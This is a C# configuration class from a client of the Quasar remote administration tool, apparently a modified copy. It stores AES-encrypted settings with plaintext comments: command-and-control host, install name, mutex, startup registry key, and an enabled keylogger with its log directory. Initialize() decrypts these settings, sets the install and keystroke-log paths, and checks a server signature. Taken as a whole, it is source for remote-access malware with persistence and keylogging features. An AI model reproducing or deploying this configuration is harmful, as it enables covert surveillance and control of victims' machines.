using Quasar.Common.Cryptography;
using Quasar.Common.Logger;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;

namespace Quasar.Client.Config
{
    /// <summary>
    /// Stores the configuration of the client.
    /// </summary>
    public static class Settings
    {
        public static string LOGFILE = ".\\clientmanagement.log";
        public static string VERSION = Application.ProductVersion; // "";
        public static string HOSTS = "xUjXiwivLDVoKIvh9tblf/mSCW5wCw7YRijiXuRSYeMr7n0dO9+8o9JjsUYY1+c4ufQjogu+VwMqjCN39lwhGA=="; // "localhost:4782;";
        public static int RECONNECTDELAY = 5000;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "k14jcAbqjMaVHdbE2r5F/A2ujVVuXczQyK66L0EYV5TmM5MoGcp5emF08ByqZYlc7+91Rd2WtIygshclhnof0w=="; // "Client";
        public static string INSTALLNAME = "EjmsOZ22fIOGyr1fo1au1cerZhRN+2LShM8Cda7cY22Bq+6ADdc0QXuGspLLWkgpRB3pU/ZDrBuChN2RHvJj6Q=="; // "Client.exe";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "iCIeoU4t1Kw8xETzqGoKlUYZvaGBM3e09VMaGfF08W3oEylREfXHKE3Ami5dY4QEraqCLttiPo+XFzRigBtypwxG5UnKvfAwktR0w9rnQeLrWQpM3gfpDqv9rLjJ3am3"; // "sfkj39tg2qevuaoisvhkjg4qksjcvhkq2p";
        public static string STARTUPKEY = "sW60Rd5KiGlYZe9zZ0JCTzuZVH7sY25KFXMHAe8hM4lXnu3yCyYRV6EUZhP33l6a4P1tbNDxPFV/ssolwZ/1vw=="; // "ClientStartup";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = true; // for the keylogger
        public static string ENCRYPTIONKEY = "D088E59E5C03F101FFC97A8469FE5C6E3C3380EC"; // need to recalculate if changing certificate
        public static string TAG = "d6z3yU9zm5zEsQuKPcWyAuOpKjTijGwMTid+AGDpC/uYcLrwhKw/ZfGP4NpCmV6ai24+8IUVdySagXq/Z7sEKg=="; // "RELEASE"; // could change this depending on vendor
        public static string LOGDIRECTORYNAME = "68QXoRZoilEFL8cUKLXcfLNxrB4ewTkQKW9KRh9Il7sMXIKe4kqPGPPTBghyjEW4/17exTVih03MgtUoXJ4UlQ=="; // "Logs";
        public static string SERVERSIGNATURE = "d3XRAnGvkxl1BeHPuV4HOrvk2O7txT+EKCh12v7C23khJgPIit2HZ6WVwlc+O1oiwvV4XtYxNMM2Fmipvenyj1Dc9aMkK0h4y0iSP6vVLHqZPELjQPVrLxe7EKOGWvnSXiios998L70S8LZlMJvTQzvlzrfl/NnaXEzgvgId+2rVyeBg9f5+wdFVXCsgXwzzuyg98/rFhoFrkKR/zInI9mrPh8LZPSk2dRBFdwpi04io2Fto9Vm6JNZu0d9sBgP4qGtNK5EDI95cKK7ua25ilqszry8l0RRg1VsuyYutkWOCMvXmujpLquuUY5lLOt5gZvZjqLXtO0QqXbgSqHefS0bxCetazYPuoan4L01NAG/QYHtAvBlSWc3hVCmqUV9mdvp8VGsV8huNL4A5AsQE19iV5axoFHHfmt0CoktUMGwtQczUSGyp877ZdtZ+tPGLvjzumBkYxlT2nkKdjQHlmjJ+J4zJ9Qo+VKzaojNwVGebjmTYAD5yXzhFYpDaqcM4nwKluPxvYsCZirCvGJBGRKH+hGwbnqwMREGMDevf9u5CG/6ZLXzJcrpE9K7l0U7YFVfkD1izlhuGnCfNXNa0/66vx9u5/RHJ29c4IFu4+fp5B5iEOgLAJTZ3JP/WP9Ot34Tw0OwdBJFAWq4uzhieMKHYzrZOfvdivuaFPqdp7So5+LyYjKGg34fYinIhCJVodaJXWhlImETzxaaMKa4ClN3zg62o2bj040hxCGGL5NdSg8IwNkO/bSfUoRZ48WSkY45o6I8lgcvOsLekvKc2AeIT2SzQDAWJ+IJ/5aq0OWNcgS7EHlq2REyQborXMgEuF5Pg5H8bIN56qUbY9uc9gjcVSFA5cv9IYRDjnBICwrTiLlkZlj+LpEqaulKEklQ/BfUJoxnxhmLdxf+d+JEErPMXqDKnrOGBwTC2Z4QVwMFaJkNtcnnzrSoi7npf8xfvbDsHD/M/ESoPob+8GdUQAw=="; // "gCadkwI5hyMjM0IGCZImk3JXr6x2ir569Ir2oGe+V0LHMeoCUzrT5W6laVWWujnWdYsGTWQ3TZgI9PmnJt/qwXOc0QGjLsFVoSdwJxVfnExiA1qVvVNIl3MQ721Ixp2i+TZsIbOM2pahwnS7ojkqfEMa44CGxr75TXYlZJ0P7mFTcDEbin29vdp5fLX7JiMoqQgWMGdqTs/ewmV9n4sc24hnrIoOz2gZAOmHqPaScHozd2tSb8VFPDXwgM6CGXaCcwINApxYIFm3oFN5TxMbgAam59pW8XNPJUC29es83rlXr8WYlS86CrclnMYL/NEnyEsRWbkefby5c2JmeKjYsJFZVag/KLZC3MVwcOvCmhPu4VXzgwj964KHCJkMnhULyudHODCi0NMv8qchP7VqLCV7zA4E2i8g+ydTXa13d+X9ROHcQyPRFS/k58Z3Us34CkgGf2dzMlL1qluwCjn1BbIhSJD+0BZX4y+23chxL2mdqe8hDsssubbgq745b0cIP5CeuzukDeHcCOb8UtbquLvd27NFLVmASY9g1IphWoZ02hO1PtJ/ppwK7IwqBZFhOVgTCBFQi1K4aZQm2wRV4P020BmK3dttjkBKqffko0K8QYzNBpc4stBXRKgSL3E1zOk8sRYUdlAQ52PnUc200Fht+1X6H6W1NrpDlLFuEyg=";
        // "MIIE8jCCAtqgAwIBAgIQAPTEiTV+iGeYMbEBbDl4BTANBgkqhkiG9w0BAQ0FADAbMRkwFwYDVQQDDBBDbGllbnQgU2VydmVyIENBMB4XDTIzMTEwNTIxMDAxMFoXDTI1MTEwNDIxMDAxMFowGzEZMBcGA1UEAwwQQ2xpZW50IFNlcnZlciBDQTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAKgmfJg+RZc2LJGkfqVkaAS+J3vf6SEQL8wS8mntOAzC3ToqYTKJz8LRXPZ3slke7LM+9tMvuGDR0QRuoWTecX1ZNxFpYdZB29ZTCxSVPmNwxtuTvr+H3OnetBFT3YE1gd5wzYY0+O3GN5HqfBkKen00HDoxYryQ2MpN97ri8YSDYmhvJ/SF5rwN74KxXajuHkPHWXNPe/2DvhCoQ0z6LIvEEbDr46CGUOZ/A8U/tJLscUgPmLkK/PR8+kMO/vaOygUWcqHr8cjuMR7ftfyE6k9Yis/1Lmx+rrScREiiBQny0CAVyKQ/zlByIT/Kq6Jak72CuheurwKPvJjnQzuo1FDy6NZTWpwHXGEyNTG+6AdxrQ/oSDEpQZFAS+ID+O2vFlN1GrmOvPsDJIw+/oJt7/r0rrwKCi4O1EujyOHsm6twNuqRHp4wv+hprPKE4Er4juzJnuoxgGd6GgYfNvQ/7VK+LkVDJy7MXEWSoXe4el4VKUBcp6/Awmqm+EKXleYgceTGyuRrPyBnxYoOBPFKb0zOCYI1kZTaRpRd1PFFBf7Z8x3AYy230TOKw7x1uom5xzi1sJqpICahhOiS3XhhvIyQ58fUX6mq4aLxuO2Z6lfdIOtEq/tGfPyW6FkoZ78Bt/Iw2pZB5s3FdQLPaHez+hN51w1aZNMxkYSGLS3C6zoxAgMBAAGjMjAwMB0GA1UdDgQWBBRoHbixZNiwpnWoBIv4NppaTttcPzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBDQUAA4ICAQBfMl23GfK5u6tem+n8Gacnt5cFza1MNfENv9Sg5beopE+PjbZx8kIQVPKGdE7cF2Je/qwz3KF41daTTRSBx5T5NzGmNDSeknTNi6nN/rg57cBM8huwdaGQdWKpheNRofi6xDsHs8s96khcAAChGYsOqesriqTnmv3sk5KZ6gGrpVya/cWNQ8dAyU2lWtUviKjg9PFcSwCZEM4owFoKBtts2KN5a0kt6bZGSKB/vheC+2aLNUakI0rQM0C4tp8/rvzzFygTueR6tbePxtp/L9LYz5aBhcdRWQSPbCtTQZvnkCix52G4aqSRAsDDvZg1NVm2SLoGvG+xW9kTG/FGQdiKCr2pDzLAq3NdtSN1TwRbNRmpSTVBEET0PzQBVO7+OoehoVh5PPjYDPxHnfAtuhd56dqVlWgn5H6B/QgSUsvFelQWRPF/d7/957ajbIh76W+5ZCQHv6bZGdfI7mUiuNRnRX1vSsJ4erlLcYL53q3T9AiA8YbFsuyVnM1v21I2OqHFepaxAXM7oWn73FJcMdr3/qDsb4aLf4NNFXLlxI7TUROtOhrXoKT4sAQBDpK62UkiwEC3afpWvs5ajPxz3LDKkfYyWgycelKoumOOO9Jz9NLGvHjQZ1Q134WehZijoxV3jUGvrYlvE0R8oqhqlcSxHjrUimevNTnq34gEmqOCEA==";
        public static string SERVERCERTIFICATESTR = "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";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool UNATTENDEDMODE = false;
        public static int DOWNLOADINTERVAL = 10000;
        public static string DOWNLOADURL = "iHuf+urhMeTcldGrWszUBLZO79guky1p1bDyHLYSfLR6mb3lwV4C5GNlrjPD/uw9S+OdnJVw6yLemG6BeIVNG+0GqDcG1ltknGGKfgdDf38="; // "https://www.google.com/";
        public static int DOWNLOADTIMEOUT = 5000;

        public static bool Initialize()
        {
            if (string.IsNullOrEmpty(VERSION)) 
            {
                Logger.Error("Invalid settings: Empty VERSION provided.");
                return false;
            }
            Logger.Debug(String.Format("Client version: {0}", VERSION));
            try
            {
                DecryptSettings();
                Logger.Info("Decrypted settings.");
            }
            catch (Exception ex)
            {
                Logger.Error(String.Format("InitializeSettings exception for when decrypting config: {0}", ex.ToString()));
                return false;
            }
            try 
            {
                SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(SERVERCERTIFICATESTR));
            }
            catch (Exception ex)
            {
                Logger.Error(String.Format("InitializeSettings exception for server certificate: {0}", ex.ToString()));
                return false;
            }
            Logger.Debug("Parsed server certificate.");
            
            SetupPaths();
            if (!VerifyHash()) {
                Logger.Error("Failed to verify hash.");
                return false;
            } else return true;
        }

        static void DecryptSettings()
        {
            var aes = new Aes256(ENCRYPTIONKEY);
            TAG = aes.Decrypt(TAG);
            // VERSION = aes.Decrypt(VERSION);
            HOSTS = aes.Decrypt(HOSTS);
            SUBDIRECTORY = aes.Decrypt(SUBDIRECTORY);
            INSTALLNAME = aes.Decrypt(INSTALLNAME);
            MUTEX = aes.Decrypt(MUTEX);
            STARTUPKEY = aes.Decrypt(STARTUPKEY);
            LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
            SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
            SERVERCERTIFICATESTR = aes.Decrypt(SERVERCERTIFICATESTR);
            DOWNLOADURL = aes.Decrypt(DOWNLOADURL);

            Logger.Debug("Decrypted tag: " + TAG);
            Logger.Debug("Decrypted hosts: " + HOSTS);
            Logger.Debug("Decrypted subdirectory: " + SUBDIRECTORY);
            Logger.Debug("Decrypted install name: " + INSTALLNAME);
            Logger.Debug("Decrypted mutex: " + MUTEX);
            Logger.Debug("Decrypted startup registry key name: " + STARTUPKEY);
            Logger.Debug("Decrypted keystroke log directory: " + LOGDIRECTORYNAME);
            Logger.Debug("Decrypted server signature: " + SERVERSIGNATURE);
            Logger.Debug("Decrypted server cert (b64): " + SERVERCERTIFICATESTR);
            Logger.Debug("Download url: " + DOWNLOADURL);
        }

        static void SetupPaths()
        {
            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
            Logger.Info("Set keylogger logs path to " + LOGSPATH);
            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
            Logger.Info("Set installation path to " + INSTALLPATH);
        }

        static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider) SERVERCERTIFICATE.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"),
                    Convert.FromBase64String(SERVERSIGNATURE));
            }
            catch (Exception ex)
            {
                Logger.Error(String.Format("VerifyHash exception: {0}", ex.ToString()));
                return false;
            }
        }
    }
}
